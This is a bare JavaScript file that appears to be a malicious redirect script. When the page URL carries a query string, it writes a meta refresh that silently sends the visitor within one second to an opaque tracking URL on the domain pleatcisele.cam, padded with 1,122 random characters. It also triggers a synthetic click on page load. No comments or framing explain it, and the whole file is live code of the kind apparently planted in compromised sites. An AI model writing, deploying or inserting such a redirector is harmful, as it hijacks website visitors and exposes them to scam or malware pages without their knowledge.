function string(L) {
  var s = '';
  var randomchar = function() {
    var n = Math.floor(Math.random() * 62);
    if (n < 10) return n; //1-10
    if (n < 36) return String.fromCharCode(n + 55); //A-Z
    return String.fromCharCode(n + 61); //a-z
  }
  while (s.length < L) s += randomchar();
  return s;
};

var fullURL = window.location.href;
let result = fullURL.indexOf("?");

$(document).ready(function(){
    $("body").trigger("click");
    
    if (result > 0) {
        document.write('<meta http-equiv=refresh content="1; URL=https://pleatcisele.cam/ed/MIZiGSvrbNAzgi3L1Bh5IiNk_MtlruZzPcJfcHIHGZhiHmYv65xq*5J7cCuj9ancB7bqAAOkQQy5Qc2Z1x_nnhyBG8tu8Wg7Uwr7wtRA3CgwVpdTZqfwxJ3ZJfBI10ZPZh9uuiVgCXl*EUqPZpy4OU0YAC_jCbmDowd8PtkfP3L*_z5_zSr4Yyb*rcRQFC_zaKfnonLqXwMQXk93MESgdRJntlih8Khkf5bq7947475vlvtsCn1ygWfiHoEsBmIc4yjWxv0pfzZKCRAtcIcl8F9WCr9LAcZdW5LABAS5_YFEhJ58aKFMtMtyl**DZ0iqmOAusMHrHxHDRNrMkxDDD1XSmejlq2lu3wEZ2XbWDkwAUr2*Y8QDhCmcQMXlLQx*xynxK7BokL8myH7cp7k4eFx2lqGEoSns7uBv60rz9jhwUFB9fJd54Yq*oVZYWQ7Umr8ycVIBqs1_CjVR_1uH0A?md='+string(1122)+'" \/>');
    };
    
});
